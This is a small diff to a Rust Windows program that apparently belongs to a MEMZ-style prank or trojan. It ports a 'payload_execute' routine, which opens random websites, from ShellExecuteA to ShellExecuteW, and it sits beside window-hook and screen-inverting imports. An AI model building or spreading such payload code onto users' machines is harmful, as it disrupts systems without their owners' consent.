@@ -17,11 +17,11 @@ use crate::{
     utils::log::{write_log, LogLocation, LogType},
     wrap_windows_api::{
         wrap_get_current_thread_id, wrap_get_system_metrics, wrap_load_icon_a, wrap_messagebox_a,
-        wrap_set_windows_hook_ex_a, wrap_shell_execute_a, wrap_unhook_windows_hook_ex, WinError,
+        wrap_set_windows_hook_ex_a, wrap_shell_execute_w, wrap_unhook_windows_hook_ex, WinError,
     },
 };
 use windows::{
-    core::PCSTR,
+    core::{PCSTR, PCWSTR},
     Win32::{
         Foundation::{GetLastError, HMODULE, HWND, LPARAM, POINT, RECT},
         Graphics::Gdi::{BitBlt, GetWindowDC, ReleaseDC, StretchBlt, NOTSRCCOPY, SRCCOPY},
@@ -102,12 +102,12 @@ pub fn payload_thread(parameter: &Payload) {
 }
 
 fn payload_execute(times: i32, _runtime: i32) -> i32 {
-    wrap_shell_execute_a(
+    wrap_shell_execute_w(
         HWND::default(),
         "open",
         SITES[rand::random::<usize>() % N_SITES],
-        PCSTR::null(),
-        PCSTR::null(),
+        PCWSTR::null(),
+        PCWSTR::null(),
         SW_SHOWDEFAULT,
     )
     .expect("Failed ShellExecuteA()");
